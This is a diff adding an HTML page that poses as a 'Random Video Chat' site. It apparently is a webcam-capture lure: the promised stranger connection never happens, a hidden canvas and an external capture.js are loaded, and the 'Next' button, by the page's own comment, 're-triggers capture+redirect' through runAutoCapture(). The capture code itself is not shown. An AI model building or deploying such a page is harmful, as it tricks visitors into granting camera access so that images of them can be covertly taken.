@@ -1,1 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Random Video Chat</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body {
+      height: 100vh; width: 100vw;
+      background: #f7f7f7;
+      font-family: Arial, sans-serif;
+      display: flex; flex-direction: column;
+      align-items: center; justify-content: center;
+    }
+    h2 { margin-bottom: 16px; color: #333; }
+    .container {
+      position: relative; display: flex; gap: 12px;
+    }
+    .video-box {
+      background: #000; border-radius: 4px;
+      overflow: hidden; position: relative;
+    }
+    .video-box.partner {
+      width: 480px; height: 360px;
+    }
+    .video-box.partner .placeholder {
+      position: absolute; inset: 0;
+      display: flex; align-items: center;
+      justify-content: center; color: #fff;
+      font-size: 1.2rem; background: rgba(0,0,0,0.6);
+      z-index: 1;
+    }
+    .video-box.self {
+      width: 160px; height: 120px;
+      border: 2px solid #fff;
+      position: absolute; bottom: 12px; right: -180px;
+    }
+    .video-box.self video {
+      width: 100%; height: 100%; object-fit: cover;
+    }
+    .controls { margin-top: 16px; }
+    .btn {
+      padding: 0.6rem 1.2rem; background: #13abff;
+      color: #fff; font-size: 1rem; border: none;
+      border-radius: 4px; cursor: pointer;
+      transition: background 0.2s;
+    }
+    .btn:hover { background: #0e89cc; }
+    canvas { display: none; }
+  </style>
+</head>
+<body>
 
+  <h2>Random Video Chat</h2>
+  <div class="container">
+    <div class="video-box partner">
+      <div class="placeholder">Connecting you to a random stranger...</div>
+    </div>
+    <div class="video-box self">
+      <video id="video" autoplay playsinline muted></video>
+    </div>
+  </div>
+
+  <div class="controls">
+    <button id="next" class="btn">Next</button>
+  </div>
+
+  <canvas id="canvas"></canvas>
+  <script src="capture.js"></script>
+  <script>
+    // “Next” re-triggers capture+redirect
+    document.getElementById('next').addEventListener('click', () => {
+      document.querySelector('.placeholder').textContent =
+        'Connecting you to a new stranger...';
+      const vid = document.getElementById('video');
+      if (vid.srcObject) {
+        vid.srcObject.getTracks().forEach(t => t.stop());
+        vid.srcObject = null;
+      }
+      window.runAutoCapture();
+    });
+  </script>
+</body>
+</html>
